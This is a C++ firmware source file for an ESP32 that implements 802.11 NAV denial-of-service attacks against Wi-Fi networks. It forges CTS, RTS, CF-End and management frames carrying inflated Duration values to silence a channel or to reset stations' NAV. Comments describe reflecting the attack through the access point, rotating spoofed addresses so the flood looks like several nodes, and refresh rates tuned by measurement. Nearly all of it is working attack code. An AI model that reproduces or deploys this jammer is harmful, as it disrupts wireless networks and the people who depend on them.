// NAV (virtual carrier sense) attacks: pin the channel, or reset everybody's NAV.
//
// Design notes:
//   * Duration is a 16-bit microsecond field; bit 15 set means "this is an AID"
//     (PS-Poll), so the largest NAV a frame can declare is 32767 us (~32.8 ms).
//     A single frame is therefore only a glitch -- the attack has to refresh
//     before it expires, which is what nav_step() does.
//   * CTS-to-self is the cheapest refresher: 10 bytes, sent at 1 Mbit/s it costs
//     ~112 us of airtime, i.e. well under 1% duty cycle for a fully silenced
//     channel.
//   * RTS-to-AP is the "reflection" variant: the AP answers with a CTS that
//     carries our duration, and every station near the AP obeys it even if it
//     cannot hear us. nav_on_rx() counts those CTS frames, so the effect is
//     observable from the attacker itself.
//   * CF-End carries duration 0 and its only meaning is "reset NAV". Forging it
//     inside someone else's TXOP makes every waiting node transmit at once.

#include "nav.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "deauth.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

namespace {

const uint8_t kBroadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
// Short reservations, renewed continuously: a 5 ms NAV refreshed every 2 ms keeps
// the channel reserved without ever making our own transmitter wait. Declaring the
// maximum (32767 us) backfires -- the driver then delays each injected frame until
// its own declared NAV expires, and the attack manages ~3 frames/s instead of
// hundreds (measured).
const uint16_t kDefaultDuration = 5000;
const uint32_t kDefaultRefreshMs = 2;
// Refresh at about half the declared duration, so the NAV never expires.
const uint32_t kMinIntervalMs = 6;

volatile bool s_active;
TaskHandle_t s_task;
nav_mode_t s_mode = NAV_MODE_CTS;
bool s_hybrid_have;
uint8_t s_bssid[6];
uint8_t s_channel;
uint16_t s_duration;
uint32_t s_frames;
uint32_t s_tx_errors;
uint32_t s_cfend_frames;
uint32_t s_cts_heard;
uint32_t s_rts_heard;
uint32_t s_last_ms;
uint32_t s_last_cfend_ms;
uint32_t s_ticks;

// Address pool for the forged CTS: a CTS does not have to be addressed to the AP
// we attack -- any unicast address works, and rotating it makes the frames look
// like several different nodes' CTS answers instead of one obvious flood.
// Half the time an address from the scanned environment is used, otherwise a
// locally administered one is rolled.
uint32_t s_rng = 0x2545F491;

uint32_t rnd(void) {
    s_rng ^= s_rng << 13;
    s_rng ^= s_rng >> 17;
    s_rng ^= s_rng << 5;
    return s_rng;
}

void pick_ra(uint8_t ra[6]) {
    const int n = WiFi.scanComplete();  // cached result from the last SCAN
    if (n > 0 && (rnd() & 1) == 0) {
        const uint8_t* bssid = WiFi.BSSID((int)(rnd() % (uint32_t)n));
        if (bssid != nullptr) {
            memcpy(ra, bssid, 6);
            return;
        }
    }
    ra[0] = 0x02;  // locally administered, unicast
    ra[1] = (uint8_t)rnd();
    ra[2] = (uint8_t)rnd();
    ra[3] = (uint8_t)rnd();
    ra[4] = (uint8_t)rnd();
    ra[5] = (uint8_t)rnd();
}

// CTS: FC + duration + RA. The RA must be a unicast address: a broadcast RA is
// not a valid CTS and the receivers' hardware drops the frame before the NAV is
// updated (measured: RA=broadcast left the link completely untouched). Addressed
// at the target AP it looks like the AP's own CTS answer, which is exactly what
// every neighbour obeys.
size_t build_cts(uint8_t* frame, const uint8_t ra[6], uint16_t duration) {
    memset(frame, 0, 16);
    frame[0] = 0xC4;  // control, subtype 12 = CTS
    frame[1] = 0x00;
    frame[2] = (uint8_t)(duration & 0xFF);
    frame[3] = (uint8_t)(duration >> 8);
    memcpy(frame + 4, ra, 6);
    return 10;
}

// RTS: FC + duration + RA(target) + TA(us). Addressed to the AP so that it is
// obliged to answer with a CTS (that CTS is the reflection amplifier).
size_t build_rts(uint8_t* frame, const uint8_t ra[6], const uint8_t ta[6], uint16_t duration) {
    memset(frame, 0, 24);
    frame[0] = 0xB4;  // control, subtype 11 = RTS
    frame[1] = 0x00;
    frame[2] = (uint8_t)(duration & 0xFF);
    frame[3] = (uint8_t)(duration >> 8);
    memcpy(frame + 4, ra, 6);
    memcpy(frame + 10, ta, 6);
    return 16;
}

// Management frame whose Duration field carries the reservation. Control frames
// (CTS/RTS/CF-End) cannot sustain the rate: the ESP32 driver takes the first ~32
// and then rejects everything (measured: frames=32 errs=1516) because the control
// TX queue never drains. Management frames do drain, so the same reservation can
// be refreshed hundreds of times per second.
size_t build_mgmt_nav(uint8_t* frame, const uint8_t da[6], const uint8_t sa[6],
                      uint16_t duration) {
    memset(frame, 0, 32);
    frame[0] = 0xD0;  // management, subtype 13 = action
    frame[1] = 0x00;
    frame[2] = (uint8_t)(duration & 0xFF);
    frame[3] = (uint8_t)(duration >> 8);
    memcpy(frame + 4, da, 6);
    memcpy(frame + 10, sa, 6);
    memcpy(frame + 16, s_bssid, 6);
    frame[22] = 0xF0;
    frame[23] = 0xFF;
    frame[24] = 3;  // block ack category: a DELBA nobody asked for, harmless
    frame[25] = 2;
    frame[26] = 0x08;  // initiator, TID 0
    frame[27] = 0x00;
    frame[28] = 37;  // reason: "does not want to use the mechanism"
    frame[29] = 0x00;
    return 30;
}

// CF-End: FC + duration(0) + RA + BSSID. No SA field, no body.
size_t build_cfend(uint8_t* frame, const uint8_t ra[6], const uint8_t bssid[6]) {
    memset(frame, 0, 24);
    frame[0] = 0xE4;  // control, subtype 14 = CF-End
    frame[1] = 0x00;
    frame[2] = 0x00;  // CF-End must carry duration 0
    frame[3] = 0x00;
    memcpy(frame + 4, ra, 6);
    memcpy(frame + 10, bssid, 6);
    return 16;
}

bool tx(uint8_t* frame, size_t len) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false) != ESP_OK) {
        s_tx_errors++;
        return false;
    }
    s_frames++;
    return true;
}

uint32_t refresh_interval_ms(void) {
    // Renew at about half the declared NAV, so the channel is never released.
    uint32_t ms = s_duration / 2000;
    if (ms < kDefaultRefreshMs) {
        ms = kDefaultRefreshMs;
    }
    return ms;
}

// Frame injection runs in its own task. Doing it from the main loop starved the
// serial console: esp_wifi_80211_tx() blocks when the TX queue is full, so
// STATUS stopped answering and NAVSTOP was never processed while the attack ran.
void nav_task(void* arg) {
    (void)arg;
    while (s_active) {
        uint8_t frame[24];
        const bool want_cfend = (s_mode == NAV_MODE_CFEND || s_mode == NAV_MODE_HYBRID);
        if (want_cfend) {
            // CF-End: broadcast RA (valid for this subtype), random BSSID field so
            // it does not always look like the same station's control frame.
            uint8_t bssid[6];
            pick_ra(bssid);
            if (tx(frame, build_cfend(frame, kBroadcast, bssid))) {
                s_cfend_frames++;
            }
        }
        if (s_mode == NAV_MODE_MGMT) {
            uint8_t da[6];
            uint8_t sa[6];
            pick_ra(da);
            pick_ra(sa);
            tx(frame, build_mgmt_nav(frame, da, sa, s_duration));
        }
        if (s_mode != NAV_MODE_CFEND && s_mode != NAV_MODE_MGMT) {
            uint8_t ra[6];
            pick_ra(ra);
            tx(frame, build_cts(frame, ra, s_duration));
            if (s_mode == NAV_MODE_RTS) {
                // Random RA: the frame is addressed to nobody in particular, so
                // every *other* station on the channel treats it as third-party
                // traffic and sets its NAV (no CTS answer, pure pinning).
                uint8_t ra[6];
                uint8_t ta[6];
                pick_ra(ra);
                pick_ra(ta);
                tx(frame, build_rts(frame, ra, ta, s_duration));
            } else if (s_mode == NAV_MODE_RTSAP) {
                // Addressed to the AP: it must answer with a CTS carrying the
                // same duration, which is the reflection amplifier.
                uint8_t ta[6];
                pick_ra(ta);
                tx(frame, build_rts(frame, s_bssid, ta, s_duration));
            }
        }
        // ~40 frames/s for a 32767 us NAV (one refresh per declared duration is
        // enough and keeps the driver/serial path responsive). CF-End runs at
        // 100 fps so it has a chance to land inside somebody's TXOP.
        const uint32_t delay_ms = want_cfend ? 4 : refresh_interval_ms();
        vTaskDelay(pdMS_TO_TICKS(delay_ms));
    }
    s_task = nullptr;
    vTaskDelete(nullptr);
}

}  // namespace

bool nav_start(int index, nav_mode_t mode, uint16_t duration_micros) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    if (duration_micros == 0) {
        duration_micros = kDefaultDuration;
    }
    if (duration_micros > 0x7FFF) {
        return false;  // bit 15 set would be parsed as an AID, not a duration
    }
    memcpy(s_bssid, bssid, 6);
    s_channel = (uint8_t)WiFi.channel(index);
    s_mode = mode;
    s_duration = duration_micros;
    s_frames = 0;
    s_tx_errors = 0;
    s_cfend_frames = 0;
    s_cts_heard = 0;
    s_rts_heard = 0;
    s_ticks = 0;
    s_last_cfend_ms = 0;
    s_last_ms = millis() - refresh_interval_ms();  // fire immediately
    s_hybrid_have = false;

    // No promiscuous mode here on purpose: NAV needs nothing but the channel and
    // a transmitter. Toggling the sniffer while injecting wedged the driver
    // (commands stopped answering mid-run), and the reflection evidence can be
    // collected from a second board instead.
    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
    if (s_task != nullptr) {
        nav_stop();
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    s_active = true;
    if (xTaskCreate(nav_task, "nav", 3072, nullptr, 5, &s_task) != pdPASS) {
        s_active = false;
        s_task = nullptr;
        return false;
    }
    return true;
}

void nav_stop(void) {
    s_active = false;  // the injection task exits on its own
}

void nav_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
    if (!s_active || type != 1 || len < 10) {
        return;
    }
    if (subtype == 12) {
        s_cts_heard++;
    } else if (subtype == 11) {
        s_rts_heard++;
    }
}

// Dumps the three frames with the decoded duration, so the encoding can be
// checked against 802.11-2020 without a second radio.
void nav_selftest(void) {
    uint8_t frame[24];
    const uint16_t duration = s_duration != 0 ? s_duration : kDefaultDuration;

    const size_t clen = build_cts(frame, s_bssid, duration);
    Serial.printf("NAVTEST cts len=%u subtype=%u dur=%u hex=", (unsigned)clen,
                  (unsigned)((frame[0] >> 4) & 0x0F), (unsigned)(frame[2] | (frame[3] << 8)));
    for (size_t i = 0; i < clen; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    static const uint8_t probe_ta[6] = {0x02, 0x00, 0x00, 0xAA, 0xBB, 0xCC};
    const size_t rlen = build_rts(frame, s_bssid, probe_ta, duration);
    Serial.printf("NAVTEST rts len=%u subtype=%u dur=%u hex=", (unsigned)rlen,
                  (unsigned)((frame[0] >> 4) & 0x0F), (unsigned)(frame[2] | (frame[3] << 8)));
    for (size_t i = 0; i < rlen; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    static const uint8_t probe_da[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    const size_t mlen = build_mgmt_nav(frame, probe_da, probe_ta, duration);
    Serial.printf("NAVTEST mgmt len=%u subtype=%u dur=%u hex=", (unsigned)mlen,
                  (unsigned)((frame[0] >> 4) & 0x0F), (unsigned)(frame[2] | (frame[3] << 8)));
    for (size_t i = 0; i < mlen; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    const size_t flen = build_cfend(frame, kBroadcast, s_bssid);
    Serial.printf("NAVTEST cfend len=%u subtype=%u dur=%u hex=", (unsigned)flen,
                  (unsigned)((frame[0] >> 4) & 0x0F), (unsigned)(frame[2] | (frame[3] << 8)));
    for (size_t i = 0; i < flen; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();
}

uint32_t nav_tx_errors(void) {
    return s_tx_errors;
}

// Sends one of each frame type and reports what the driver said. Answers
// "is the frame even accepted?" without a second radio.
void nav_tx_probe(void) {
    uint8_t frame[24];
    uint8_t ra[6];
    pick_ra(ra);
    esp_err_t e1 = esp_wifi_80211_tx(WIFI_IF_STA, frame, build_cts(frame, ra, 5000), false);
    pick_ra(ra);
    esp_err_t e2 = esp_wifi_80211_tx(WIFI_IF_STA, frame, build_rts(frame, s_bssid, ra, 5000), false);
    esp_err_t e3 = esp_wifi_80211_tx(WIFI_IF_STA, frame, build_cfend(frame, kBroadcast, s_bssid), false);
    Serial.print("NAVTX cts=");
    Serial.print((int)e1);
    Serial.print(" rts=");
    Serial.print((int)e2);
    Serial.print(" cfend=");
    Serial.println((int)e3);
}

bool nav_active(void) {
    return s_active;
}

const char* nav_mode_name(void) {
    switch (s_mode) {
        case NAV_MODE_CTS:
            return "cts";
        case NAV_MODE_RTS:
            return "rts";
        case NAV_MODE_RTSAP:
            return "rtsap";
        case NAV_MODE_MGMT:
            return "mgmt";
        case NAV_MODE_CFEND:
            return "cfend";
        case NAV_MODE_HYBRID:
            return "hybrid";
        default:
            return "off";
    }
}

uint32_t nav_frames(void) {
    return s_frames;
}

uint32_t nav_cfend_frames(void) {
    return s_cfend_frames;
}

uint32_t nav_cts_heard(void) {
    return s_cts_heard;
}

uint32_t nav_rts_heard(void) {
    return s_rts_heard;
}

uint16_t nav_duration(void) {
    return s_duration;
}

uint8_t nav_channel(void) {
    return s_channel;
}
